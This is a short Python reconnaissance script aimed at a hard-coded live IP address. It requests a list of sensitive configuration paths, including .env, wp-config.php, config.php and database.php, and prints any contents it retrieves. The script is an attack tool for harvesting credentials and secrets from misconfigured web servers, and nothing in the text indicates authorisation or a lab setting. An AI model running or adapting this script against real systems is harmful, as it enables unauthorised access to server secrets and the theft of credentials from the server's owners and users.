
import requests
import re

base_url = "http://31.97.117.123"

# Try to find and read configuration files
config_paths = [
    "/config/config.inc.php",
    "/config.php",
    "/config.inc.php",
    "/database.php",
    "/includes/config.php",
    "/.env",
    "/php.ini",
    "/wp-config.php",
]

print("[*] Attempting to access configuration files...")

for path in config_paths:
    url = base_url + path
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200 and len(response.text) > 0:
            print(f"\n[+] Found: {path}")
            print(response.text[:500])
    except:
        pass

print("\n[*] Done searching for config files")

